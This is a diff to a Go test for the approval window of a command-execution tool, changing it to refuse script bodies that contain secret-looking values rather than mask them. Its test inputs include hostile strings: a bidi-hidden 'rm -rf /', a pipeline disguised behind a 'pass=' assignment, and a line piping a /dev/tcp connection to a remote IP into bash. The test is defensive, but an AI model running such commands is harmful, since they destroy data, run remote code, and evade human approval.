@@ -12,8 +12,8 @@ import (
 )
 
 // O2: the window for exec --script FILE and --stdin-file shows the
-// body's SHA-256 and first lines (masked); a body it cannot show is
-// refused without a window, like a command line.
+// body's SHA-256 and first lines; a body it cannot show is refused
+// without a window, like a command line.
 func TestApprovalWindowShowsScriptBody(t *testing.T) {
 	saved := os.Args
 	t.Cleanup(func() { os.Args = saved; g.allowDangerous, g.yes = false, false })
@@ -29,7 +29,7 @@ func TestApprovalWindowShowsScriptBody(t *testing.T) {
 	os.Args = []string{"komando", "exec", "web", "--script", "./deploy.sh", "--yes"}
 
 	var body strings.Builder
-	body.WriteString("#!/bin/sh\n\tsystemctl restart app\nexport PGPASSWORD=Sup3rS3cretValue99\n")
+	body.WriteString("#!/bin/sh\n\tsystemctl restart app\nexport PGHOST=db1\n")
 	for i := range 20 {
 		body.WriteString("echo line" + string(rune('a'+i)) + "\n")
 	}
@@ -54,12 +54,20 @@ func TestApprovalWindowShowsScriptBody(t *testing.T) {
 			t.Errorf("window has no %q:\n%s", want, w)
 		}
 	}
-	if strings.Contains(w, "Sup3rS3cretValue99") || strings.Contains(w, "echo linek") {
-		t.Errorf("window shows a secret or more than the first lines:\n%s", w)
+	if strings.Contains(w, "echo linek") {
+		t.Errorf("window shows more than the first lines:\n%s", w)
 	}
 
-	// a bidi override anywhere in the body: no window, refused
-	for _, bad := range []string{"echo ok\n" + strings.Repeat("true\n", 30) + "echo \u202erm -rf /\n", "echo \xff\xfe\n"} {
+	// a bidi override anywhere in the body, or what looks like a secret
+	// (the masker would show "pass=x|sh</tmp/s" as "pass=[hidden]", a
+	// harmless line, while the body runs a pipeline): no window, refused
+	for _, bad := range []string{
+		"echo ok\n" + strings.Repeat("true\n", 30) + "echo \u202erm -rf /\n",
+		"echo \xff\xfe\n",
+		"pass=x|sh</tmp/s\n",
+		"DB_PASSWORD=1|bash</dev/tcp/203.0.113.9/80\n",
+		"export PGPASSWORD=Sup3rS3cretValue99\n",
+	} {
 		resetApproval()
 		texts = nil
 		noteApprovalBody(scriptLabel("the input", "-"), []byte(bad))
